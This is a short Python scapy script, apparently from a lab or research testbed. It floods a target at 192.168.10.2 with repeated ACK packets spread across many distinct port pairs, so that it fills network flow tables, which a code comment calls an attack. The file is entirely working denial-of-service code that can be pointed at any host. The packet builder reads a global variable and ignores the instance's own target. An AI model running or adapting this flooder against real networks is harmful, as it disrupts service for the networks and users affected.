from scapy.all import *
import time
import random
import sys

class GenerateFlows(object):
    def __init__(self, iface, target, flows):
        super(GenerateFlows, self).__init__()
        self.iface = iface
        self.target = target
        # max flow entries during attacks 
        self.max_flows = flows
        self.idle_time = 3
        self.pkts_ival = 1
    
    def gen_pkts(self):
        fab_pkts = []
        for i in range(self.max_flows):
            sport = i + 54321
            dport = i + 12345
            payload = b'\x00' * random.randint(100, 200)
            pkt = Ether()/IP(dst=target)/TCP(sport=sport, dport=dport, flags="A")/payload
            fab_pkts.append(pkt)
        return fab_pkts

    def start(self, times=10000):
        fab_pkts = self.gen_pkts()
        print('starting...')
        for i in range(times):
            cur_time = time.time()
            end_time = time.time() + self.idle_time
            # print('round: {0}'.format(i))
            while cur_time < end_time:
                sendp(fab_pkts, iface=self.iface, verbose=False)
                time.sleep(self.pkts_ival)
                cur_time += self.pkts_ival

if __name__ == '__main__':
    target = '192.168.10.2'
    try:
        for idx, param in enumerate(sys.argv):
            if param == '-e':
                iface = sys.argv[idx+1]
            elif param == '-f':
                flows = int(sys.argv[idx+1])
        filler = GenerateFlows(iface, target, flows)
        filler.start()
    except KeyboardInterrupt:
        print('test done...')
